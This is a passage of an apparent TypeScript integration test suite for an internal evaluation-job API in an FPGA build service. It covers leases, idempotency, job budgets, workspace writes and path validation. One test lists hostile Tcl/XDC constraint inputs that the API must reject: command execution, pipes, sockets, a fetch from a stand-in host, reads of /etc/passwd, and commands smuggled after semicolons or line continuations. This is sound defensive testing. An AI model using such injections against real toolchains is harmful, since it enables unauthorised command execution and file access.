      new Date(firstRun.rows[0]!.deadline_at).getTime()
      - new Date(firstRun.rows[0]!.budget_started_at).getTime(),
    ).toBe(2 * 60 * 60 * 1000);
    const inputBefore = await harness.client.query(
      `SELECT eval_input_ref,input_manifest_hash,source_commit,source_manifest_hash
         FROM evolution_eval_input WHERE curator_run_id=$1`,
      [fixture.runId],
    );
    expect(inputBefore.rows).toHaveLength(1);
    expect(inputBefore.rows[0]).toMatchObject({
      eval_input_ref: first.evalInputRef,
      input_manifest_hash: first.inputManifestHash,
      source_commit: fixture.sourceCommit,
      source_manifest_hash: first.sourceManifestHash,
    });

    await harness.client.query(
      "UPDATE curator_run SET lease_expires_at=now()-interval '1 second' WHERE id=$1",
      [fixture.runId],
    );
    const reclaimed = await claimFixture(fixture);
    expect(reclaimed.leaseToken).not.toBe(first.leaseToken);
    expect(reclaimed.evalInputRef).toBe(first.evalInputRef);
    expect(reclaimed.inputManifestHash).toBe(first.inputManifestHash);
    expect(reclaimed.sourceManifestHash).toBe(first.sourceManifestHash);
    const runAfter = await harness.client.query(
      `SELECT budget_started_at,deadline_at FROM evolution_eval_run WHERE curator_run_id=$1`,
      [fixture.runId],
    );
    expect(new Date(runAfter.rows[0]!.budget_started_at).toISOString())
      .toBe(new Date(firstRun.rows[0]!.budget_started_at).toISOString());
    expect(new Date(runAfter.rows[0]!.deadline_at).toISOString())
      .toBe(new Date(firstRun.rows[0]!.deadline_at).toISOString());

    const dryFixture = await seedClaimable("dry", { mode: "dry_run" });
    const dryResponse = await apiCall(
      harness.baseUrl,
      "/api/v1/internal/evolution/curator-runs/claim-manual",
      {
        method: "POST",
        token: curatorToken,
        body: { worker_id: "dry-worker", lease_seconds: 60 },
      },
    );
    expect(dryResponse.status).toBe(200);
    const dryRun = record(responseData(dryResponse.json).run);
    expect(dryRun.run_id).toBe(dryFixture.runId);
    const dryBundle = (dryRun.applications as unknown[]).map(record)
      .find((candidate) => record(candidate.application).application_id === dryFixture.applicationId)!;
    expect(dryBundle.eval_input).toBeNull();
    expect(record(dryRun.eval_recovery)).toMatchObject({
      budget_started_at: null,
      deadline_at: null,
      jobs: [],
    });
    const dryFacts = await harness.client.query(
      `SELECT
         (SELECT count(*)::int FROM evolution_eval_run WHERE curator_run_id=$1) AS runs,
         (SELECT count(*)::int FROM evolution_eval_input WHERE curator_run_id=$1) AS inputs`,
      [dryFixture.runId],
    );
    expect(dryFacts.rows[0]).toMatchObject({ runs: 0, inputs: 0 });

    const unicodeFixture = await seedClaimable("unicode", { sourcePath: "rtl/主控.sv" });
    const unicodeResponse = await apiCall(
      harness.baseUrl,
      "/api/v1/internal/evolution/curator-runs/claim-manual",
      {
        method: "POST",
        token: curatorToken,
        body: { worker_id: "unicode-worker", lease_seconds: 60 },
      },
    );
    expect(unicodeResponse.status).toBe(200);
    const unicodeRun = record(responseData(unicodeResponse.json).run);
    expect(unicodeRun.run_id).toBe(unicodeFixture.runId);
    const unicodeBundle = (unicodeRun.applications as unknown[]).map(record)
      .find((candidate) => record(candidate.application).application_id === unicodeFixture.applicationId)!;
    expect(unicodeBundle.eval_input).toBeNull();
    const unicodeInputCount = await harness.client.query(
      "SELECT count(*)::int AS count FROM evolution_eval_input WHERE curator_run_id=$1",
      [unicodeFixture.runId],
    );
    expect(unicodeInputCount.rows[0]!.count).toBe(0);
  });

  test("prepare rejects unknown, caller-owned, raw and non-portable fields with zero business writes", async () => {
    const claim = await claimFixture(await seedClaimable("strict-prepare"));
    const valid = prepareBody(claim);
    const parameters = record(valid.parameters);
    const cases: { readonly name: string; readonly body: Record<string, unknown>; readonly code: string }[] = [
      { name: "top-unknown", body: { ...valid, unexpected: true }, code: "EVOLUTION_EVAL_INVALID_REQUEST" },
      {
        name: "nested-unknown",
        body: { ...valid, parameters: { ...parameters, unexpected: true } },
        code: "EVOLUTION_EVAL_INVALID_REQUEST",
      },
      { name: "caller-project", body: { ...valid, project_id: claim.projectId }, code: "EVOLUTION_EVAL_INVALID_REQUEST" },
      { name: "caller-class", body: { ...valid, run_class: "evolution_eval" }, code: "EVOLUTION_EVAL_OPERATION_FORBIDDEN" },
      { name: "raw-command", body: { ...valid, command: "vivado -mode batch" }, code: "EVOLUTION_EVAL_OPERATION_FORBIDDEN" },
      {
        name: "raw-tcl",
        body: { ...valid, parameters: { ...parameters, tcl: "open_hw_manager" } },
        code: "EVOLUTION_EVAL_OPERATION_FORBIDDEN",
      },
      {
        name: "absolute",
        body: { ...valid, parameters: { ...parameters, source_paths: ["/tmp/top.sv"] } },
        code: "EVOLUTION_EVAL_INVALID_REQUEST",
      },
      {
        name: "dotdot",
        body: { ...valid, parameters: { ...parameters, source_paths: ["rtl/../top.sv"] } },
        code: "EVOLUTION_EVAL_INVALID_REQUEST",
      },
      {
        name: "unicode",
        body: { ...valid, parameters: { ...parameters, source_paths: ["rtl/主控.sv"] } },
        code: "EVOLUTION_EVAL_INVALID_REQUEST",
      },
    ];
    for (const invalid of cases) {
      const response = await prepare(claim, `invalid-${invalid.name}`, invalid.body);
      expect(response.status, invalid.name).toBe(400);
      expect(responseError(response.json).code, invalid.name).toBe(invalid.code);
    }
    const facts = await harness.client.query(
      `SELECT
         (SELECT count(*)::int FROM evolution_eval_job WHERE curator_run_id=$1) AS jobs,
         (SELECT count(*)::int FROM tool_run WHERE run_class='evolution_eval') AS tool_runs,
         (SELECT count(*)::int FROM evolution_eval_workspace) AS workspaces,
         (SELECT count(*)::int FROM evolution_eval_idempotency WHERE curator_run_id=$1) AS idempotency`,
      [claim.runId],
    );
    expect(facts.rows[0]).toMatchObject({ jobs: 0, tool_runs: 0, workspaces: 0, idempotency: 0 });
  });

  test("prepare is atomic and validates the current lease before replay", async () => {
    const claim = await claimFixture(await seedClaimable("prepare-facts"));
    const key = "prepare-stable-key";
    const first = await prepare(claim, key);
    expect(first.status).toBe(201);
    const prepared = responseData(first.json);
    expect(prepared).toMatchObject({
      schema: "evolution-eval-prepare-result.v1",
      ordinal: 1,
      state: "submitted",
      workspace_revision: 1,
      source_commit: claim.sourceCommit,
      source_manifest_hash: claim.sourceManifestHash,
      replayed: false,
    });
    const evalJobId = String(prepared.eval_job_id);
    const toolRunId = String(prepared.tool_run_id);
    const workspaceId = String(prepared.workspace_id);
    const facts = await harness.client.query(
      `SELECT
        (SELECT count(*)::int FROM evolution_eval_job WHERE id=$1) AS jobs,
        (SELECT count(*)::int FROM tool_run
          WHERE id=$2 AND run_class='evolution_eval' AND state='submitted'
            AND command IS NULL) AS tool_runs,
        (SELECT count(*)::int FROM evolution_eval_workspace
          WHERE id=$3 AND eval_job_id=$1) AS workspaces,
        (SELECT count(*)::int FROM evolution_eval_workspace_revision
          WHERE workspace_id=$3 AND revision=1) AS revisions,
        (SELECT count(*)::int FROM evolution_eval_workspace_projection
          WHERE workspace_id=$3 AND current_revision=1 AND sealed_at IS NULL) AS projections,
        (SELECT count(*)::int FROM evolution_eval_audit_event WHERE eval_job_id=$1) AS audits,
        (SELECT count(*)::int FROM outbox_events
          WHERE aggregate_type='evolution_eval_job' AND aggregate_id=$1) AS outbox,
        (SELECT count(*)::int FROM evolution_eval_idempotency
          WHERE curator_run_id=$4 AND action='prepare' AND idempotency_key=$5
            AND completed_at IS NOT NULL) AS idempotency,
        (SELECT count(*)::int FROM evolution_eval_operation_fact
          WHERE eval_job_id=$1 AND fact_type IN ('prepare','workspace_revision','workspace_projection')) AS operations,
        (SELECT count(*)::int FROM evolution_eval_dispatch WHERE eval_job_id=$1) AS dispatches,
        (SELECT count(*)::int FROM evolution_eval_dispatch_tombstone WHERE eval_job_id=$1) AS tombstones`,
      [evalJobId, toolRunId, workspaceId, claim.runId, key],
    );
    expect(facts.rows[0]).toMatchObject({
      jobs: 1,
      tool_runs: 1,
      workspaces: 1,
      revisions: 1,
      projections: 1,
      idempotency: 1,
      operations: 3,
      dispatches: 0,
      tombstones: 0,
    });
    expect(facts.rows[0]!.audits).toBeGreaterThanOrEqual(3);
    expect(facts.rows[0]!.outbox).toBeGreaterThanOrEqual(3);
    expect(connectorCalls).toBe(0);

    await harness.client.query(
      "UPDATE curator_run SET lease_expires_at=now()-interval '1 second' WHERE id=$1",
      [claim.runId],
    );
    const reclaimed = await claimFixture(claim);
    const stale = await prepare(claim, key);
    expect(stale.status).toBe(409);
    expect(responseError(stale.json).code).toBe("EVOLUTION_LEASE_CONFLICT");
    const replayBody = { ...prepareBody(reclaimed), curator_lease_token: reclaimed.leaseToken };
    const replay = await prepare(reclaimed, key, replayBody);
    expect(replay.status).toBe(200);
    expect(responseData(replay.json)).toMatchObject({ eval_job_id: evalJobId, replayed: true });
    const changed = await prepare(reclaimed, key, { ...replayBody, timeout_ms: 59_999 });
    expect(changed.status).toBe(409);
    expect(responseError(changed.json).code).toBe("EVOLUTION_EVAL_IDEMPOTENCY_CONFLICT");
    const noDuplicates = await harness.client.query(
      `SELECT
         (SELECT count(*)::int FROM evolution_eval_job WHERE curator_run_id=$1) AS jobs,
         (SELECT count(*)::int FROM evolution_eval_idempotency WHERE curator_run_id=$1) AS idempotency`,
      [claim.runId],
    );
    expect(noDuplicates.rows[0]).toMatchObject({ jobs: 1, idempotency: 1 });
  });

  test("prepare serializes concurrent drafts and enforces the immutable three-job budget", async () => {
    const claim = await claimFixture(await seedClaimable("serial"));
    const concurrent = await Promise.all([
      prepare(claim, "concurrent-a"),
      prepare(claim, "concurrent-b"),
    ]);
    const successes = concurrent.filter((response) => response.status === 201);
    const conflicts = concurrent.filter((response) => response.status === 409);
    expect(successes).toHaveLength(1);
    expect(conflicts).toHaveLength(1);
    expect(responseError(conflicts[0]!.json).code).toBe("EVOLUTION_EVAL_SERIAL_CONFLICT");
    const firstJobId = String(responseData(successes[0]!.json).eval_job_id);

    const stillOpen = await prepare(claim, "serial-explicit");
    expect(stillOpen.status).toBe(409);
    expect(responseError(stillOpen.json).code).toBe("EVOLUTION_EVAL_SERIAL_CONFLICT");
    await terminalizeSubmitted(firstJobId);

    const second = await prepare(claim, "serial-second");
    expect(second.status).toBe(201);
    expect(responseData(second.json).ordinal).toBe(2);
    await terminalizeSubmitted(String(responseData(second.json).eval_job_id));
    const third = await prepare(claim, "serial-third");
    expect(third.status).toBe(201);
    expect(responseData(third.json).ordinal).toBe(3);
    await terminalizeSubmitted(String(responseData(third.json).eval_job_id));
    const fourth = await prepare(claim, "serial-fourth");
    expect(fourth.status).toBe(409);
    expect(responseError(fourth.json).code).toBe("EVOLUTION_EVAL_BUDGET_EXHAUSTED");

    const rows = await harness.client.query(
      `SELECT j.ordinal,t.state
         FROM evolution_eval_job j JOIN tool_run t ON t.id=j.tool_run_id
        WHERE j.curator_run_id=$1 ORDER BY j.ordinal`,
      [claim.runId],
    );
    expect(rows.rows).toEqual([
      { ordinal: 1, state: "rejected" },
      { ordinal: 2, state: "rejected" },
      { ordinal: 3, state: "rejected" },
    ]);
  });

  test("workspace read/write/recover use strict DTOs, portable paths, CAS and zero-write resource rejection", async () => {
    const claim = await claimFixture(await seedClaimable("workspace"));
    const preparedResponse = await prepare(claim, "workspace-prepare");
    expect(preparedResponse.status).toBe(201);
    const prepared = responseData(preparedResponse.json);
    const evalJobId = String(prepared.eval_job_id);
    const workspaceId = String(prepared.workspace_id);
    const basePath = `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/${evalJobId}`;

    const readBody = {
      schema: "evolution-eval-workspace-read.v1",
      curator_lease_token: claim.leaseToken,
      workspace_id: workspaceId,
      workspace_revision: 1,
      paths: [claim.sourcePath],
    };
    const read = await apiCall(harness.baseUrl, `${basePath}/workspace/read`, {
      method: "POST",
      token: evaluatorToken,
      body: readBody,
    });
    expect(read.status).toBe(200);
    const sourceFiles = responseData(read.json).files as unknown[];
    expect(sourceFiles).toHaveLength(1);
    expect(record(sourceFiles[0])).toMatchObject({
      path: claim.sourcePath,
      sha256: hash(claim.sourceContent),
      read_only: true,
      content_base64: Buffer.from(claim.sourceContent).toString("base64"),
    });

    const overlayContent = "module top_tb; top dut(); endmodule\n";
    const writeBody = {
      schema: "evolution-eval-workspace-write.v1",
      curator_lease_token: claim.leaseToken,
      workspace_id: workspaceId,
      expected_workspace_revision: 1,
      changes: [{
        action: "upsert",
        path: "tb/top_tb.sv",
        sha256: hash(overlayContent),
        content_base64: Buffer.from(overlayContent).toString("base64"),
      }],
    };
    const write = await apiCall(harness.baseUrl, `${basePath}/workspace/write`, {
      method: "POST",
      token: evaluatorToken,
      headers: { "idempotency-key": "workspace-write" },
      body: writeBody,
    });
    expect(write.status).toBe(200);
    expect(responseData(write.json)).toMatchObject({
      schema: "evolution-eval-workspace-result.v1",
      workspace_id: workspaceId,
      workspace_revision: 2,
      replayed: false,
    });

    const readOverlay = await apiCall(harness.baseUrl, `${basePath}/workspace/read`, {
      method: "POST",
      token: evaluatorToken,
      body: { ...readBody, workspace_revision: 2, paths: ["tb/top_tb.sv"] },
    });
    expect(readOverlay.status).toBe(200);
    expect(record((responseData(readOverlay.json).files as unknown[])[0])).toMatchObject({
      path: "tb/top_tb.sv",
      read_only: false,
      content_base64: Buffer.from(overlayContent).toString("base64"),
    });

    const staleWrite = await apiCall(harness.baseUrl, `${basePath}/workspace/write`, {
      method: "POST",
      token: evaluatorToken,
      headers: { "idempotency-key": "workspace-stale" },
      body: { ...writeBody, changes: [{ action: "delete", path: "tb/top_tb.sv" }] },
    });
    expect(staleWrite.status).toBe(409);
    expect(responseError(staleWrite.json).code).toBe("EVOLUTION_EVAL_BINDING_CONFLICT");

    const oversizedContent = Buffer.alloc(1024 * 1024 + 1, 0x20);
    const limited = await apiCall(harness.baseUrl, `${basePath}/workspace/write`, {
      method: "POST",
      token: evaluatorToken,
      headers: { "idempotency-key": "workspace-resource-limit" },
      body: {
        ...writeBody,
        expected_workspace_revision: 2,
        changes: [{
          action: "upsert",
          path: "overlay/oversized.sv",
          sha256: hash(oversizedContent),
          content_base64: oversizedContent.toString("base64"),
        }],
      },
    });
    expect(limited.status).toBe(413);
    expect(responseError(limited.json).code).toBe("EVOLUTION_EVAL_RESOURCE_LIMIT");
    const unchanged = await harness.client.query(
      `SELECT
         (SELECT count(*)::int FROM evolution_eval_workspace_revision WHERE workspace_id=$1) AS revisions,
         (SELECT current_revision FROM evolution_eval_workspace_projection WHERE workspace_id=$1) AS current_revision,
         (SELECT count(*)::int FROM evolution_eval_workspace_file
           WHERE workspace_id=$1 AND revision=2 AND layer='overlay') AS overlays`,
      [workspaceId],
    );
    expect(unchanged.rows[0]).toMatchObject({ revisions: 2, current_revision: 2, overlays: 1 });

    const strictCalls = [
      apiCall(harness.baseUrl, `${basePath}/workspace/read`, {
        method: "POST",
        token: evaluatorToken,
        body: { ...readBody, unexpected: true },
      }),
      apiCall(harness.baseUrl, `${basePath}/workspace/read`, {
        method: "POST",
        token: evaluatorToken,
        body: { ...readBody, paths: ["/tmp/top.sv"] },
      }),
      apiCall(harness.baseUrl, `${basePath}/workspace/read`, {
        method: "POST",
        token: evaluatorToken,
        body: { ...readBody, paths: ["rtl/../top.sv"] },
      }),
      apiCall(harness.baseUrl, `${basePath}/workspace/read`, {
        method: "POST",
        token: evaluatorToken,
        body: { ...readBody, paths: ["rtl/主控.sv"] },
      }),
      apiCall(harness.baseUrl, `${basePath}/workspace/write`, {
        method: "POST",
        token: evaluatorToken,
        headers: { "idempotency-key": "strict-write-top" },
        body: { ...writeBody, expected_workspace_revision: 2, command: "vivado" },
      }),
      apiCall(harness.baseUrl, `${basePath}/workspace/write`, {
        method: "POST",
        token: evaluatorToken,
        headers: { "idempotency-key": "strict-write-nested" },
        body: {
          ...writeBody,
          expected_workspace_revision: 2,
          changes: [{ ...record(writeBody.changes[0]), unexpected: true }],
        },
      }),
      apiCall(
        harness.baseUrl,
        `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/recover`,
        {
          method: "POST",
          token: evaluatorToken,
          body: {
            schema: "evolution-eval-recover.v1",
            curator_lease_token: claim.leaseToken,
            unexpected: true,
          },
        },
      ),
    ];
    const strictResponses = await Promise.all(strictCalls);
    expect(strictResponses.every((response) => response.status === 400)).toBe(true);
    for (const response of strictResponses) {
      expect(responseError(response.json).code).toBe("EVOLUTION_EVAL_INVALID_REQUEST");
    }

    const recover = await apiCall(
      harness.baseUrl,
      `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/recover`,
      {
        method: "POST",
        token: evaluatorToken,
        body: { schema: "evolution-eval-recover.v1", curator_lease_token: claim.leaseToken },
      },
    );
    expect(recover.status).toBe(200);
    const recovery = responseData(recover.json);
    expect(recovery.budget_started_at).toEqual(expect.any(String));
    expect(recovery.deadline_at).toEqual(expect.any(String));
    const recoveredJobs = recovery.jobs as unknown[];
    expect(recoveredJobs).toHaveLength(1);
    expect(record(recoveredJobs[0])).toMatchObject({
      eval_job_id: evalJobId,
      application_id: claim.applicationId,
      version_id: claim.versionId,
      ordinal: 1,
      operation: "synthesize",
      state: "submitted",
      workspace_id: workspaceId,
      workspace_revision: 2,
      workspace_sealed: false,
    });
  });

  test("workspace write accepts declarative XDC and rejects executable or host-reaching XDC with zero writes", async () => {
    const claim = await claimFixture(await seedClaimable("xdc-policy"));
    const preparedResponse = await prepare(claim, "xdc-policy-prepare");
    expect(preparedResponse.status).toBe(201);
    const prepared = responseData(preparedResponse.json);
    const evalJobId = String(prepared.eval_job_id);
    const workspaceId = String(prepared.workspace_id);
    const writePath = `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/${evalJobId}/workspace/write`;
    const safeXdc = [
      "set_property PACKAGE_PIN W5 [get_ports clk]",
      "set_property IOSTANDARD LVCMOS33 [get_ports clk]",
      "create_clock -name sys_clk -period 10.000 [get_ports clk]",
      "",
    ].join("\n");
    const safeWrite = await apiCall(harness.baseUrl, writePath, {
      method: "POST",
      token: evaluatorToken,
      headers: { "idempotency-key": "xdc-safe" },
      body: {
        schema: "evolution-eval-workspace-write.v1",
        curator_lease_token: claim.leaseToken,
        workspace_id: workspaceId,
        expected_workspace_revision: 1,
        changes: [{
          action: "upsert",
          path: "constraints/top.xdc",
          sha256: hash(safeXdc),
          content_base64: Buffer.from(safeXdc).toString("base64"),
        }],
      },
    });
    expect(safeWrite.status).toBe(200);
    expect(responseData(safeWrite.json)).toMatchObject({
      workspace_revision: 2,
      replayed: false,
    });

    const maliciousXdc = [
      { name: "exec", content: "exec /usr/bin/id\n" },
      { name: "open-pipe", content: "open |/usr/bin/id r\n" },
      { name: "socket", content: "socket example.invalid 443\n" },
      { name: "source", content: "source /tmp/untrusted.tcl\n" },
      { name: "load", content: "load /tmp/plugin.so\n" },
      { name: "package", content: "package require http\n" },
      { name: "command-substitution", content: "set_property PACKAGE_PIN W5 [exec /usr/bin/id]\n" },
      { name: "nested-substitution", content: "set_property PACKAGE_PIN W5 [get_ports [exec /usr/bin/id]]\n" },
      { name: "environment", content: "set_property PACKAGE_PIN $::env(FPGA_PIN) [get_ports clk]\n" },
      { name: "host-posix-absolute", content: "set_property SOURCE_FILE /etc/passwd [get_ports clk]\n" },
      { name: "host-windows-absolute", content: "set_property SOURCE_FILE C:/Windows/win.ini [get_ports clk]\n" },
      { name: "http-network", content: "http::geturl https://example.invalid/payload\n" },
      { name: "semicolon", content: "set_property PACKAGE_PIN W5 [get_ports clk]; exec /usr/bin/id\n" },
      { name: "continuation", content: "set_property PACKAGE_PIN W5 [get_ports clk] \\\nexec /usr/bin/id\n" },
    ] as const;
    const before = await harness.client.query(
      `SELECT
         (SELECT count(*)::int FROM evolution_eval_workspace_revision WHERE workspace_id=$1) AS revisions,
         (SELECT count(*)::int FROM evolution_eval_workspace_file WHERE workspace_id=$1) AS files,
         (SELECT current_revision FROM evolution_eval_workspace_projection WHERE workspace_id=$1) AS current_revision,
         (SELECT count(*)::int FROM evolution_eval_idempotency WHERE curator_run_id=$2) AS idempotency,
         (SELECT count(*)::int FROM evolution_eval_audit_event WHERE curator_run_id=$2) AS audits,
         (SELECT count(*)::int FROM outbox_events
           WHERE aggregate_type='evolution_eval_job' AND aggregate_id=$3) AS outbox`,
      [workspaceId, claim.runId, evalJobId],
    );
    for (const vector of maliciousXdc) {
      const response = await apiCall(harness.baseUrl, writePath, {
        method: "POST",
        token: evaluatorToken,
        headers: { "idempotency-key": `xdc-hostile-${vector.name}` },
        body: {
          schema: "evolution-eval-workspace-write.v1",
          curator_lease_token: claim.leaseToken,
          workspace_id: workspaceId,
          expected_workspace_revision: 2,
          changes: [{
            action: "upsert",
            path: `constraints/${vector.name}.xdc`,
            sha256: hash(vector.content),
            content_base64: Buffer.from(vector.content).toString("base64"),
          }],
        },
      });
      expect(response.status, vector.name).toBe(400);
      expect(responseError(response.json).code, vector.name).toBe("EVOLUTION_EVAL_OPERATION_FORBIDDEN");
    }
    const after = await harness.client.query(
      `SELECT
         (SELECT count(*)::int FROM evolution_eval_workspace_revision WHERE workspace_id=$1) AS revisions,
         (SELECT count(*)::int FROM evolution_eval_workspace_file WHERE workspace_id=$1) AS files,
         (SELECT current_revision FROM evolution_eval_workspace_projection WHERE workspace_id=$1) AS current_revision,
         (SELECT count(*)::int FROM evolution_eval_idempotency WHERE curator_run_id=$2) AS idempotency,
         (SELECT count(*)::int FROM evolution_eval_audit_event WHERE curator_run_id=$2) AS audits,
         (SELECT count(*)::int FROM outbox_events
           WHERE aggregate_type='evolution_eval_job' AND aggregate_id=$3) AS outbox`,
      [workspaceId, claim.runId, evalJobId],
    );
    expect(after.rows[0]).toEqual(before.rows[0]);
    expect(connectorCalls).toBe(0);
  });

  test("non-NFC bindings, URL ids and nested paths fail closed with zero writes", async () => {
    const claim = await claimFixture(await seedClaimable("unicode-normalization"));
    const preparedResponse = await prepare(claim, "unicode-normalization-prepare");
    expect(preparedResponse.status).toBe(201);
    const prepared = responseData(preparedResponse.json);
    const evalJobId = String(prepared.eval_job_id);
    const workspaceId = String(prepared.workspace_id);
    const nfd = "e\u0301";
    const nfc = "é";
    expect(nfd).not.toBe(nfc);
    expect(nfd.normalize("NFC")).toBe(nfc);
    const preparePath = `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/prepare`;
    const jobPath = `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/${evalJobId}`;
    const before = await harness.client.query(
      `SELECT
         (SELECT count(*)::int FROM evolution_eval_job WHERE curator_run_id=$1) AS jobs,
         (SELECT count(*)::int FROM evolution_eval_workspace_revision) AS revisions,
         (SELECT count(*)::int FROM evolution_eval_workspace_file) AS files,
         (SELECT count(*)::int FROM evolution_eval_idempotency WHERE curator_run_id=$1) AS idempotency,
         (SELECT count(*)::int FROM evolution_eval_audit_event WHERE curator_run_id=$1) AS audits,
         (SELECT count(*)::int FROM outbox_events WHERE aggregate_type='evolution_eval_job') AS outbox,
         (SELECT count(*)::int FROM evolution_eval_transition_fact) AS transitions,
         (SELECT count(*)::int FROM evolution_eval_dispatch) AS dispatches`,
      [claim.runId],
    );
    const cases = [
      apiCall(harness.baseUrl, preparePath, {
        method: "POST",
        token: evaluatorToken,
        headers: { "idempotency-key": "nfd-application" },
        body: { ...prepareBody(claim), application_id: `application_${nfd}` },
      }),
      apiCall(harness.baseUrl, `${jobPath}/workspace/read`, {
        method: "POST",
        token: evaluatorToken,
        body: {
          schema: "evolution-eval-workspace-read.v1",
          curator_lease_token: claim.leaseToken,
          workspace_id: `workspace_${nfd}`,
          workspace_revision: 1,
          paths: [claim.sourcePath],
        },
      }),
      apiCall(
        harness.baseUrl,
        `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/recover`,
        {
          method: "POST",
          token: evaluatorToken,
          body: {
            schema: "evolution-eval-recover.v1",
            curator_lease_token: `lease_${nfd}`,
          },
        },
      ),
      // Fetch/Headers cannot express U+0301 because HTTP header values are
      // ByteStrings. A raw UTF-8 attempt is rejected by Bun's HTTP parser
      // before Core and therefore has no HTTP response at all; DB zero-write
      // below proves it never becomes an alternate idempotency key.
      rawApiCallWithHeader(preparePath, "Idempotency-Key", `key_${nfd}`, prepareBody(claim)),
      apiCall(harness.baseUrl, preparePath, {
        method: "POST",
        token: evaluatorToken,
        headers: { "idempotency-key": "k".repeat(129) },
        body: prepareBody(claim),
      }),
      apiCall(
        harness.baseUrl,
        `/api/v1/internal/evolution/curator-runs/run_${nfd}/eval-jobs/recover`,
        {
          method: "POST",
          token: evaluatorToken,
          body: {
            schema: "evolution-eval-recover.v1",
            curator_lease_token: claim.leaseToken,
          },
        },
      ),
      apiCall(
        harness.baseUrl,
        `/api/v1/internal/evolution/curator-runs/${claim.runId}/eval-jobs/job_${nfd}/workspace/read`,
        {
          method: "POST",
          token: evaluatorToken,
          body: {
            schema: "evolution-eval-workspace-read.v1",
            curator_lease_token: claim.leaseToken,
            workspace_id: workspaceId,
            workspace_revision: 1,
            paths: [claim.sourcePath],
          },
        },
      ),
      apiCall(harness.baseUrl, `${jobPath}/workspace/read`, {
        method: "POST",
        token: evaluatorToken,
        body: {
          schema: "evolution-eval-workspace-read.v1",
          curator_lease_token: claim.leaseToken,
          workspace_id: workspaceId,
          workspace_revision: 1,
          paths: [`rtl/caf${nfd}.sv`],
        },
      }),
    ];
    const responses = await Promise.all(cases);
    expect(responses.map((response) => response.status)).toEqual([400, 400, 400, 0, 400, 400, 400, 400]);
    for (const response of responses.filter((_, index) => index !== 3)) {
      expect(responseError(response.json).code).toBe("EVOLUTION_EVAL_INVALID_REQUEST");
    }
    const after = await harness.client.query(
      `SELECT
         (SELECT count(*)::int FROM evolution_eval_job WHERE curator_run_id=$1) AS jobs,
         (SELECT count(*)::int FROM evolution_eval_workspace_revision) AS revisions,
         (SELECT count(*)::int FROM evolution_eval_workspace_file) AS files,
         (SELECT count(*)::int FROM evolution_eval_idempotency WHERE curator_run_id=$1) AS idempotency,
         (SELECT count(*)::int FROM evolution_eval_audit_event WHERE curator_run_id=$1) AS audits,
         (SELECT count(*)::int FROM outbox_events WHERE aggregate_type='evolution_eval_job') AS outbox,
         (SELECT count(*)::int FROM evolution_eval_transition_fact) AS transitions,
         (SELECT count(*)::int FROM evolution_eval_dispatch) AS dispatches`,
      [claim.runId],
    );
    expect(after.rows[0]).toEqual(before.rows[0]);
    expect(connectorCalls).toBe(0);
  });

  test("claim and recover create one durable reconcile fact for a sealed running job without Connector calls", async () => {
    const firstClaim = await claimFixture(await seedClaimable("reconcile-intent"));
    const preparedResponse = await prepare(firstClaim, "reconcile-intent-prepare");
    expect(preparedResponse.status).toBe(201);
    const prepared = responseData(preparedResponse.json);
    const evalJobId = String(prepared.eval_job_id);
    await sealDispatchAndAdvanceToRunning(evalJobId);
    expect(connectorCalls).toBe(0);

    await harness.client.query(
      "UPDATE curator_run SET lease_expires_at=now()-interval '1 second' WHERE id=$1",
      [firstClaim.runId],
    );
    const reclaimed = await claimFixture(firstClaim);
    expect(reclaimed.leaseToken).not.toBe(firstClaim.leaseToken);
    const firstFacts = await harness.client.query(
      `SELECT f.id,f.reconciliation_sequence,f.reconcile_request_hash,
              f.workspace_id,f.workspace_revision,f.workspace_manifest_hash,
              f.audit_event_id,f.outbox_event_id,f.evolution_origin_txid,
              a.event_type,a.request_hash AS audit_request_hash,
              a.workspace_manifest_hash AS audit_workspace_manifest_hash,
              a.project_id,a.correlation_id,a.operation,a.file_count,a.byte_count,
              a.evolution_origin_txid AS audit_origin_txid,
              o.event_type AS outbox_event_type,o.payload AS outbox_payload,
              o.evolution_origin_txid AS outbox_origin_txid,
              j.reconciliation_state,j.connector_job_id,j.connector_idempotency_key,
              p.current_revision,r.manifest_hash
         FROM evolution_eval_reconcile_fact f
         JOIN evolution_eval_job j ON j.id=f.eval_job_id
         JOIN evolution_eval_audit_event a ON a.id=f.audit_event_id
         JOIN outbox_events o ON o.event_id=f.outbox_event_id
         JOIN evolution_eval_workspace_projection p ON p.workspace_id=j.workspace_id
         JOIN evolution_eval_workspace_revision r
           ON r.workspace_id=p.workspace_id AND r.revision=p.current_revision
        WHERE f.eval_job_id=$1`,
      [evalJobId],
    );
    expect(firstFacts.rows).toHaveLength(1);
    const fact = firstFacts.rows[0]!;
    expect(fact).toMatchObject({
      reconciliation_sequence: 1,
      event_type: "reconcile_required",
      outbox_event_type: "evolution_eval.reconcile_requested",
      reconciliation_state: "required",
      workspace_revision: fact.current_revision,
      workspace_manifest_hash: fact.manifest_hash,
      audit_request_hash: fact.reconcile_request_hash,
      audit_workspace_manifest_hash: fact.workspace_manifest_hash,
      audit_origin_txid: fact.evolution_origin_txid,
      outbox_origin_txid: fact.evolution_origin_txid,
    });
    expect(fact.outbox_payload).toEqual({
      fact_id: fact.id,
      reconcile_request_hash: fact.reconcile_request_hash,
      reconciliation_sequence: 1,
      connector_job_id: fact.connector_job_id,
      connector_idempotency_key: fact.connector_idempotency_key,
      workspace_id: fact.workspace_id,
      workspace_revision: Number(fact.workspace_revision),
      workspace_manifest_hash: fact.workspace_manifest_hash,
    });
    const recoveryJob = (reclaimed.evalRecovery.jobs as unknown[])
      .map(record)
      .find((job) => job.eval_job_id === evalJobId)!;
    expect(recoveryJob).toMatchObject({
      eval_job_id: evalJobId,
      state: "running",
      workspace_id: prepared.workspace_id,
      workspace_sealed: true,
      reconciliation_state: "required",
    });

    const recoverPath = `/api/v1/internal/evolution/curator-runs/${firstClaim.runId}/eval-jobs/recover`;
    const recoverBody = {
      schema: "evolution-eval-recover.v1",
      curator_lease_token: reclaimed.leaseToken,
    };
    const concurrent = await Promise.all([
      apiCall(harness.baseUrl, recoverPath, {
        method: "POST",
        token: evaluatorToken,
        body: recoverBody,
      }),
      apiCall(harness.baseUrl, recoverPath, {
        method: "POST",
        token: evaluatorToken,
        body: recoverBody,
      }),
    ]);
